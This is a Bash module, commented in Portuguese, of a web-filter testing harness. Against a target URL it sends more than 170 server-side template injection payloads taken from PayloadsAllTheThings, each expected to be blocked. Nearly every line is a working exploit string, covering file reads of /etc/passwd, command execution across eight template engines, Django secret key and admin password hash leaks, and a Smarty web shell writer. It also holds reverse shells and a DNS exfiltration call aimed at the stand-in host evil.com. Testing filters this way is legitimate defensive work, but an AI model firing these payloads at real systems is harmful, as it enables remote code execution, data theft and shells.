#!/bin/bash
#==============================================================================
# SSTI Tester - Script especializado em testes de SSTI (Server-Side Template Injection)
# Versão: 1.0.0
# Descrição: Script modular para testes de SSTI usando payloads do PayloadsAllTheThings
#==============================================================================

# Importar cores e variáveis (se chamado diretamente)
if [ -z "$RED" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    BOLD='\033[1m'
    NC='\033[0m'
fi

# Diretório base do script
SSTI_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SSTI_PAYLOADS_DIR="${SSTI_SCRIPT_DIR}/PayloadsAllTheThings/Server Side Template Injection"

#==============================================================================
# FUNÇÕES AUXILIARES
#==============================================================================

ssti_print_section() {
    local title="$1"
    local shortcut="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ -n "$shortcut" ]; then
        echo -e "${BOLD}${MAGENTA}$title ${CYAN}($shortcut)${NC}"
    else
        echo -e "${BOLD}${MAGENTA}$title${NC}"
    fi
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

ssti_print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TESTES SSTI DETECTION - Universal Payloads
#==============================================================================
test_ssti_detection() {
    ssti_print_subsection "SSTI Detection - Universal Payloads (20 variações)"
    
    # Polyglot detection
    test_curl "SSTI Detect: Polyglot" "block" -A "$UA" -Lk "${URL}?name=\${{<%[%'\"}}%\\."
    
    # Mathematical expression (rendered)
    test_curl "SSTI Detect: {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
    test_curl "SSTI Detect: \${7*7}" "block" -A "$UA" -Lk "${URL}?name=\${7*7}"
    test_curl "SSTI Detect: #{7*7}" "block" -A "$UA" -Lk "${URL}?name=#{7*7}"
    test_curl "SSTI Detect: <%= 7*7 %>" "block" -A "$UA" -Lk "${URL}?name=<%=7*7%>"
    test_curl "SSTI Detect: *{7*7}" "block" -A "$UA" -Lk "${URL}?name=*{7*7}"
    test_curl "SSTI Detect: @{7*7}" "block" -A "$UA" -Lk "${URL}?name=@{7*7}"
    
    # Error-based detection
    test_curl "SSTI Detect: Error-based" "block" -A "$UA" -Lk "${URL}?name={{(1/0).zxy.zxy}}"
    test_curl "SSTI Detect: Error \${}" "block" -A "$UA" -Lk "${URL}?name=\${(1/0).zxy.zxy}"
    
    # Boolean-based pairs
    test_curl "SSTI Detect: Boolean OK" "block" -A "$UA" -Lk "${URL}?name={{(3*4/2)}}"
    test_curl "SSTI Detect: Boolean ERR" "block" -A "$UA" -Lk "${URL}?name={{3*)2(/4}}"
    
    # String multiplication
    test_curl "SSTI Detect: String {{7*'7'}}" "block" -A "$UA" -Lk "${URL}?name={{7*'7'}}"
    test_curl "SSTI Detect: String \${7*'7'}" "block" -A "$UA" -Lk "${URL}?name=\${7*'7'}"
    
    # In different contexts
    test_curl "SSTI Detect: POST body" "block" -A "$UA" -Lk "${URL}" --data "name={{7*7}}"
    test_curl "SSTI Detect: JSON" "block" -A "$UA" -Lk -H "Content-Type: application/json" "${URL}" --data '{"name":"{{7*7}}"}'
    test_curl "SSTI Detect: Cookie" "block" -A "$UA" -Lk -b "session={{7*7}}" "${URL}"
    test_curl "SSTI Detect: User-Agent" "block" -Lk -A "{{7*7}}" "${URL}"
    test_curl "SSTI Detect: Referer" "block" -A "$UA" -Lk -H "Referer: {{7*7}}" "${URL}"
    
    # Mixed syntax
    test_curl "SSTI Detect: {{4*4}}[[5*5]]" "block" -A "$UA" -Lk "${URL}?name={{4*4}}[[5*5]]"
    test_curl "SSTI Detect: {{config.items()}}" "block" -A "$UA" -Lk "${URL}?name={{config.items()}}"
}

#==============================================================================
# TESTES SSTI JINJA2 (Python/Flask)
#==============================================================================
test_ssti_jinja2() {
    ssti_print_subsection "SSTI Jinja2 - Python/Flask (30 variações)"
    
    # Basic injection
    test_curl "SSTI Jinja2: Basic {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
    test_curl "SSTI Jinja2: {{7*'7'}}" "block" -A "$UA" -Lk "${URL}?name={{7*'7'}}"
    test_curl "SSTI Jinja2: {{config}}" "block" -A "$UA" -Lk "${URL}?name={{config}}"
    test_curl "SSTI Jinja2: {{config.items()}}" "block" -A "$UA" -Lk "${URL}?name={{config.items()}}"
    
    # Class exploration
    test_curl "SSTI Jinja2: [].__class__" "block" -A "$UA" -Lk "${URL}?name={{[].__class__}}"
    test_curl "SSTI Jinja2: ''.__class__.__mro__" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__}}"
    test_curl "SSTI Jinja2: subclasses()" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__[2].__subclasses__()}}"
    
    # File read attempts
    test_curl "SSTI Jinja2: Read /etc/passwd" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
    test_curl "SSTI Jinja2: Read flag" "block" -A "$UA" -Lk "${URL}?name={{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/tmp/flag').read()}}"
    test_curl "SSTI Jinja2: open() builtin" "block" -A "$UA" -Lk "${URL}?name={{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}"
    
    # RCE attempts - os.popen
    test_curl "SSTI Jinja2: RCE os.popen id" "block" -A "$UA" -Lk "${URL}?name={{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    test_curl "SSTI Jinja2: RCE cycler" "block" -A "$UA" -Lk "${URL}?name={{cycler.__init__.__globals__.os.popen('id').read()}}"
    test_curl "SSTI Jinja2: RCE joiner" "block" -A "$UA" -Lk "${URL}?name={{joiner.__init__.__globals__.os.popen('id').read()}}"
    test_curl "SSTI Jinja2: RCE namespace" "block" -A "$UA" -Lk "${URL}?name={{namespace.__init__.__globals__.os.popen('id').read()}}"
    test_curl "SSTI Jinja2: RCE lipsum" "block" -A "$UA" -Lk "${URL}?name={{lipsum.__globals__['os'].popen('id').read()}}"
    
    # RCE - subprocess.Popen
    test_curl "SSTI Jinja2: RCE Popen cat" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}"
    test_curl "SSTI Jinja2: RCE config os" "block" -A "$UA" -Lk "${URL}?name={{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
    
    # Without guessing offset
    test_curl "SSTI Jinja2: RCE no offset" "block" -A "$UA" -Lk "${URL}?name={%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__%}{{x()._module.__builtins__['__import__']('os').popen('id').read().zfill(417)}}{%endif%}{%endfor%}"
    
    # Obfuscation
    test_curl "SSTI Jinja2: Obfuscated RCE" "block" -A "$UA" -Lk "${URL}?name={{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
    
    # Filter bypass - underscore
    test_curl "SSTI Jinja2: Bypass _" "block" -A "$UA" -Lk "${URL}?name={{request|attr(['__','class','__']|join)}}"
    test_curl "SSTI Jinja2: Bypass [] with ()" "block" -A "$UA" -Lk "${URL}?name={{request|attr(('__','class','__')|join)}}"
    
    # Debug statement
    test_curl "SSTI Jinja2: {% debug %}" "block" -A "$UA" -Lk "${URL}?name={%debug%}"
    
    # __globals__ access
    test_curl "SSTI Jinja2: __globals__" "block" -A "$UA" -Lk "${URL}?name={{self.__init__.__globals__.__builtins__}}"
    
    # Config dump
    test_curl "SSTI Jinja2: Config dump" "block" -A "$UA" -Lk "${URL}?name={%for key,value in config.iteritems()%}{{key}}:{{value}}{%endfor%}"
    
    # Write file
    test_curl "SSTI Jinja2: Write file" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/pwned.txt','w').write('HACKED')}}"
    
    # Evil config
    test_curl "SSTI Jinja2: Evil config" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.cfg','w').write('from subprocess import check_output\\nRUNCMD=check_output\\n')}}"
    
    # Reverse shell
    test_curl "SSTI Jinja2: Reverse shell" "block" -A "$UA" -Lk "${URL}?name={{config['RUNCMD']('/bin/bash -c \"/bin/bash -i >&/dev/tcp/evil.com/4444 0>&1\"',shell=True)}}"
    
    # Boolean-based RCE
    test_curl "SSTI Jinja2: Boolean RCE" "block" -A "$UA" -Lk "${URL}?name={{1/(cycler.__init__.__globals__.os.popen('id')._proc.wait()==0)}}"
    
    # Time-based
    test_curl "SSTI Jinja2: Time-based" "block" -A "$UA" -Lk "${URL}?name={{cycler.__init__.__globals__.os.popen('sleep 5').read()}}"
}

#==============================================================================
# TESTES SSTI DJANGO (Python)
#==============================================================================
test_ssti_django() {
    ssti_print_subsection "SSTI Django - Python (15 variações)"
    
    # Basic detection
    test_curl "SSTI Django: {% csrf_token %}" "block" -A "$UA" -Lk "${URL}?name={%csrf_token%}"
    test_curl "SSTI Django: {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
    test_curl "SSTI Django: {{364|add:733}}" "block" -A "$UA" -Lk "${URL}?name={{364|add:733}}"
    
    # XSS
    test_curl "SSTI Django: XSS" "block" -A "$UA" -Lk "${URL}?name={{' <script>alert(1)</script>'}}"
    test_curl "SSTI Django: XSS safe" "block" -A "$UA" -Lk "${URL}?name={{' <script>alert(1)</script>'|safe}}"
    
    # Debug
    test_curl "SSTI Django: {% debug %}" "block" -A "$UA" -Lk "${URL}?name={%debug%}"
    
    # Secret key leak
    test_curl "SSTI Django: Secret key" "block" -A "$UA" -Lk "${URL}?name={{messages.storages.0.signer.key}}"
    
    # Admin URL leak
    test_curl "SSTI Django: Admin URL" "block" -A "$UA" -Lk "${URL}?name={%include 'admin/base.html'%}"
    
    # Admin user leak
    test_curl "SSTI Django: Admin users" "block" -A "$UA" -Lk "${URL}?name={%load log%}{%get_admin_log 10 as log%}{%for e in log%}{{e.user.get_username}}:{{e.user.password}}{%endfor%}"
    
    # Settings
    test_curl "SSTI Django: Settings" "block" -A "$UA" -Lk "${URL}?name={{settings}}"
    test_curl "SSTI Django: SECRET_KEY" "block" -A "$UA" -Lk "${URL}?name={{settings.SECRET_KEY}}"
    
    # Database
    test_curl "SSTI Django: Database" "block" -A "$UA" -Lk "${URL}?name={{settings.DATABASES}}"
    
    # For loop
    test_curl "SSTI Django: For loop" "block" -A "$UA" -Lk "${URL}?name={%for item in settings%}{{item}}{%endfor%}"
    
    # Load module
    test_curl "SSTI Django: Load os" "block" -A "$UA" -Lk "${URL}?name={%load os%}"
    
    # Template tags
    test_curl "SSTI Django: Template tags" "block" -A "$UA" -Lk "${URL}?name={%templatetag openblock%}"
}

#==============================================================================
# TESTES SSTI MAKO (Python)
#==============================================================================
test_ssti_mako() {
    ssti_print_subsection "SSTI Mako - Python (20 variações)"
    
    # Basic injection
    test_curl "SSTI Mako: \${7*7}" "block" -A "$UA" -Lk "${URL}?name=\${7*7}"
    test_curl "SSTI Mako: \${7*'7'}" "block" -A "$UA" -Lk "${URL}?name=\${7*'7'}"
    
    # Import os
    test_curl "SSTI Mako: Import os" "block" -A "$UA" -Lk "${URL}?name=<%import os%>\${os.system('id')}"
    test_curl "SSTI Mako: os.popen" "block" -A "$UA" -Lk "${URL}?name=<%import os;x=os.popen('id').read()%>\${x}"
    
    # Direct RCE paths
    test_curl "SSTI Mako: cache.util.os" "block" -A "$UA" -Lk "${URL}?name=\${self.module.cache.util.os.system('id')}"
    test_curl "SSTI Mako: runtime.util.os" "block" -A "$UA" -Lk "${URL}?name=\${self.module.runtime.util.os.system('id')}"
    test_curl "SSTI Mako: template.module" "block" -A "$UA" -Lk "${URL}?name=\${self.template.module.cache.util.os.system('id')}"
    test_curl "SSTI Mako: compat.inspect" "block" -A "$UA" -Lk "${URL}?name=\${self.module.cache.compat.inspect.os.system('id')}"
    test_curl "SSTI Mako: __init__.__globals__" "block" -A "$UA" -Lk "${URL}?name=\${self.__init__.__globals__['util'].os.system('id')}"
    test_curl "SSTI Mako: template.__init__" "block" -A "$UA" -Lk "${URL}?name=\${self.template.__init__.__globals__['os'].system('id')}"
    test_curl "SSTI Mako: filters.compat" "block" -A "$UA" -Lk "${URL}?name=\${self.module.filters.compat.inspect.os.system('id')}"
    test_curl "SSTI Mako: exceptions.util" "block" -A "$UA" -Lk "${URL}?name=\${self.module.runtime.exceptions.util.os.system('id')}"
    test_curl "SSTI Mako: _mmarker" "block" -A "$UA" -Lk "${URL}?name=\${self.template._mmarker.module.cache.util.os.system('id')}"
    test_curl "SSTI Mako: attr._NSAttr" "block" -A "$UA" -Lk "${URL}?name=\${self.attr._NSAttr__parent.module.cache.util.os.system('id')}"
    test_curl "SSTI Mako: context._with_template" "block" -A "$UA" -Lk "${URL}?name=\${self.context._with_template.module.cache.util.os.system('id')}"
    
    # Obfuscated RCE
    test_curl "SSTI Mako: Obfuscated 'id'" "block" -A "$UA" -Lk "${URL}?name=\${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
    test_curl "SSTI Mako: Obfuscated import" "block" -A "$UA" -Lk "${URL}?name=<%import os%>\${os.popen(str().join(chr(i)for(i)in[105,100])).read()}"
    
    # popen().read()
    test_curl "SSTI Mako: popen('whoami')" "block" -A "$UA" -Lk "${URL}?name=\${self.module.cache.util.os.popen('whoami').read()}"
    test_curl "SSTI Mako: popen('ls')" "block" -A "$UA" -Lk "${URL}?name=\${self.module.cache.util.os.popen('ls -la').read()}"
    test_curl "SSTI Mako: popen('cat')" "block" -A "$UA" -Lk "${URL}?name=\${self.module.cache.util.os.popen('cat /etc/passwd').read()}"
}

#==============================================================================
# TESTES SSTI TORNADO (Python)
#==============================================================================
test_ssti_tornado() {
    ssti_print_subsection "SSTI Tornado - Python (10 variações)"
    
    # Basic injection
    test_curl "SSTI Tornado: {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
    test_curl "SSTI Tornado: {{7*'7'}}" "block" -A "$UA" -Lk "${URL}?name={{7*'7'}}"
    
    # RCE
    test_curl "SSTI Tornado: os.system" "block" -A "$UA" -Lk "${URL}?name={{os.system('whoami')}}"
    test_curl "SSTI Tornado: import os" "block" -A "$UA" -Lk "${URL}?name={%import os%}{{os.system('id')}}"
    test_curl "SSTI Tornado: os.popen" "block" -A "$UA" -Lk "${URL}?name={%import os%}{{os.popen('id').read()}}"
    
    # __import__
    test_curl "SSTI Tornado: __import__ os" "block" -A "$UA" -Lk "${URL}?name={{__import__('os').system('id')}}"
    test_curl "SSTI Tornado: __import__ subprocess" "block" -A "$UA" -Lk "${URL}?name={{__import__('subprocess').check_output('id',shell=True)}}"
    
    # Universal payloads
    test_curl "SSTI Tornado: __include__" "block" -A "$UA" -Lk "${URL}?name={{__include__('os').popen('id').read()}}"
    
    # DNS exfil
    test_curl "SSTI Tornado: DNS exfil" "block" -A "$UA" -Lk "${URL}?name={%import os%}{{os.system('nslookup evil.com')}}"
    
    # Reverse shell
    test_curl "SSTI Tornado: Reverse shell" "block" -A "$UA" -Lk "${URL}?name={%import os%}{{os.system('bash -i >&/dev/tcp/evil.com/4444 0>&1')}}"
}

#==============================================================================
# TESTES SSTI TWIG (PHP)
#==============================================================================
test_ssti_twig() {
    ssti_print_subsection "SSTI Twig - PHP (15 variações)"
    
    # Basic injection
    test_curl "SSTI Twig: {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
    test_curl "SSTI Twig: {{7*'7'}}" "block" -A "$UA" -Lk "${URL}?name={{7*'7'}}"
    test_curl "SSTI Twig: {{\"<script>alert(1)</script>\"}}" "block" -A "$UA" -Lk "${URL}?name={{\"<script>alert(1)</script>\"}}"
    
    # File read
    test_curl "SSTI Twig: File read" "block" -A "$UA" -Lk "${URL}?name={{'/etc/passwd'|file_excerpt(1,30)}}"
    test_curl "SSTI Twig: Include" "block" -A "$UA" -Lk "${URL}?name={{include('/etc/passwd')}}"
    
    # RCE attempts
    test_curl "SSTI Twig: _self.env" "block" -A "$UA" -Lk "${URL}?name={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
    test_curl "SSTI Twig: _self.env system" "block" -A "$UA" -Lk "${URL}?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('whoami')}}"
    test_curl "SSTI Twig: _self.env passthru" "block" -A "$UA" -Lk "${URL}?name={{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}"
    
    # Filter map
    test_curl "SSTI Twig: map filter" "block" -A "$UA" -Lk "${URL}?name={{['id']|map('system')|join}}"
    test_curl "SSTI Twig: filter exec" "block" -A "$UA" -Lk "${URL}?name={{['id','ls']|filter('system')}}"
    
    # getFilter
    test_curl "SSTI Twig: getFilter" "block" -A "$UA" -Lk "${URL}?name={{_self.env.getFilter('system')}}"
    
    # Config/debug
    test_curl "SSTI Twig: dump()" "block" -A "$UA" -Lk "${URL}?name={{dump(app)}}"
    test_curl "SSTI Twig: dump(_self)" "block" -A "$UA" -Lk "${URL}?name={{dump(_self)}}"
    
    # For loop
    test_curl "SSTI Twig: For loop" "block" -A "$UA" -Lk "${URL}?name={%for item in _self.env%}{{item}}{%endfor%}"
    
    # PHP functions
    test_curl "SSTI Twig: phpinfo" "block" -A "$UA" -Lk "${URL}?name={{_self.env.registerUndefinedFilterCallback('phpinfo')}}{{_self.env.getFilter(1)}}"
}

#==============================================================================
# TESTES SSTI SMARTY (PHP)
#==============================================================================
test_ssti_smarty() {
    ssti_print_subsection "SSTI Smarty - PHP (10 variações)"
    
    # Basic injection
    test_curl "SSTI Smarty: {7*7}" "block" -A "$UA" -Lk "${URL}?name={7*7}"
    test_curl "SSTI Smarty: {7*'7'}" "block" -A "$UA" -Lk "${URL}?name={7*'7'}"
    
    # PHP execution
    test_curl "SSTI Smarty: {php}phpinfo(){/php}" "block" -A "$UA" -Lk "${URL}?name={php}phpinfo(){/php}"
    test_curl "SSTI Smarty: {php}system('id'){/php}" "block" -A "$UA" -Lk "${URL}?name={php}system('id'){/php}"
    
    # File read
    test_curl "SSTI Smarty: File read" "block" -A "$UA" -Lk "${URL}?name={file_get_contents('/etc/passwd')}"
    
    # Static methods
    test_curl "SSTI Smarty: static system" "block" -A "$UA" -Lk "${URL}?name={Smarty_Internal_Write_File::writeFile(\$SCRIPT_NAME,\"<?php passthru(\\\$_GET['cmd']); ?>\",true)}"
    
    # self::
    test_curl "SSTI Smarty: self getStreamVariable" "block" -A "$UA" -Lk "${URL}?name={self::getStreamVariable('file:///etc/passwd')}"
    
    # Smarty.get
    test_curl "SSTI Smarty: \$smarty.get" "block" -A "$UA" -Lk "${URL}?cmd=id&name={\$smarty.get.cmd}"
    
    # Include
    test_curl "SSTI Smarty: include" "block" -A "$UA" -Lk "${URL}?name={include file='/etc/passwd'}"
    
    # eval
    test_curl "SSTI Smarty: eval" "block" -A "$UA" -Lk "${URL}?name={eval var=\$GLOBALS}"
}

#==============================================================================
# TESTES SSTI FREEMARKER (Java)
#==============================================================================
test_ssti_freemarker() {
    ssti_print_subsection "SSTI Freemarker - Java (15 variações)"
    
    # Basic injection
    test_curl "SSTI Freemarker: \${7*7}" "block" -A "$UA" -Lk "${URL}?name=\${7*7}"
    test_curl "SSTI Freemarker: \${7*'7'}" "block" -A "$UA" -Lk "${URL}?name=\${7*'7'}"
    
    # Object creation
    test_curl "SSTI Freemarker: new() java.lang" "block" -A "$UA" -Lk "${URL}?name=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('id')}"
    test_curl "SSTI Freemarker: ObjectConstructor" "block" -A "$UA" -Lk "${URL}?name=<#assign value='freemarker.template.utility.ObjectConstructor'?new()>\${value('java.lang.ProcessBuilder','ls').start()}"
    
    # Execute
    test_curl "SSTI Freemarker: Execute whoami" "block" -A "$UA" -Lk "${URL}?name=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('whoami')}"
    test_curl "SSTI Freemarker: Execute cat" "block" -A "$UA" -Lk "${URL}?name=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('cat /etc/passwd')}"
    
    # JythonRuntime
    test_curl "SSTI Freemarker: JythonRuntime" "block" -A "$UA" -Lk "${URL}?name=<#assign value='freemarker.template.utility.JythonRuntime'?new()><@value>import os;os.system('id')</@value>"
    
    # File read
    test_curl "SSTI Freemarker: File read" "block" -A "$UA" -Lk "${URL}?name=\${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"
    
    # Class method
    test_curl "SSTI Freemarker: getClass()" "block" -A "$UA" -Lk "${URL}?name=\${''.getClass()}"
    test_curl "SSTI Freemarker: forName" "block" -A "$UA" -Lk "${URL}?name=\${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}"
    
    # ProcessBuilder
    test_curl "SSTI Freemarker: ProcessBuilder" "block" -A "$UA" -Lk "${URL}?name=<#assign value='freemarker.template.utility.ObjectConstructor'?new()>\${value('java.lang.ProcessBuilder',['id']).start()}"
    
    # API builtin
    test_curl "SSTI Freemarker: ?api" "block" -A "$UA" -Lk "${URL}?name=\${''.?api}"
    
    # builtin extends
    test_curl "SSTI Freemarker: builtin" "block" -A "$UA" -Lk "${URL}?name=<#assign classloader=object?api.class.protectionDomain.classLoader>"
    
    # Reverse shell
    test_curl "SSTI Freemarker: Reverse shell" "block" -A "$UA" -Lk "${URL}?name=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('bash -c \"bash -i >&/dev/tcp/evil.com/4444 0>&1\"')}"
    
    # Directory listing
    test_curl "SSTI Freemarker: ls -la" "block" -A "$UA" -Lk "${URL}?name=<#assign ex='freemarker.template.utility.Execute'?new()>\${ex('ls -la')}"
}

#==============================================================================
# TESTES SSTI ERB (Ruby)
#==============================================================================
test_ssti_erb() {
    ssti_print_subsection "SSTI ERB - Ruby (10 variações)"
    
    # Basic injection
    test_curl "SSTI ERB: <%= 7*7 %>" "block" -A "$UA" -Lk "${URL}?name=<%=7*7%>"
    test_curl "SSTI ERB: <%= 7*'7' %>" "block" -A "$UA" -Lk "${URL}?name=<%=7*'7'%>"
    
    # RCE
    test_curl "SSTI ERB: system('id')" "block" -A "$UA" -Lk "${URL}?name=<%=system('id')%>"
    test_curl "SSTI ERB: %x{id}" "block" -A "$UA" -Lk "${URL}?name=<%=%x{id}%>"
    test_curl "SSTI ERB: \`id\`" "block" -A "$UA" -Lk "${URL}?name=<%=\`id\`%>"
    
    # exec
    test_curl "SSTI ERB: exec('id')" "block" -A "$UA" -Lk "${URL}?name=<%=exec('id')%>"
    
    # IO.popen
    test_curl "SSTI ERB: IO.popen" "block" -A "$UA" -Lk "${URL}?name=<%=IO.popen('id').readlines()%>"
    
    # Dir.entries
    test_curl "SSTI ERB: Dir.entries" "block" -A "$UA" -Lk "${URL}?name=<%=Dir.entries('/')%>"
    
    # File.read
    test_curl "SSTI ERB: File.read" "block" -A "$UA" -Lk "${URL}?name=<%=File.read('/etc/passwd')%>"
    
    # Kernel.system
    test_curl "SSTI ERB: Kernel.system" "block" -A "$UA" -Lk "${URL}?name=<%=Kernel.system('whoami')%>"
}

#==============================================================================
# FUNÇÃO PRINCIPAL - Executa todos os testes SSTI
#==============================================================================
run_all_ssti_tests() {
    ssti_print_section "🔨 TESTES COMPLETOS DE SSTI (PayloadsAllTheThings)" "-c ssti"
    
    echo -e "${CYAN}ℹ️  Usando payloads do PayloadsAllTheThings/Server Side Template Injection${NC}"
    echo -e "${CYAN}ℹ️  Total estimado: 170+ testes de SSTI${NC}"
    echo ""
    
    test_ssti_detection
    test_ssti_jinja2
    test_ssti_django
    test_ssti_mako
    test_ssti_tornado
    test_ssti_twig
    test_ssti_smarty
    test_ssti_freemarker
    test_ssti_erb
    
    echo ""
    echo -e "${GREEN}✓ Todos os testes SSTI foram concluídos!${NC}"
}

# Se o script for executado diretamente (não como source)
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    echo -e "${RED}❌ Este script deve ser chamado pelo head-test.sh${NC}"
    echo -e "${YELLOW}Use: ./head-test.sh -u URL -c ssti${NC}"
    exit 1
fi
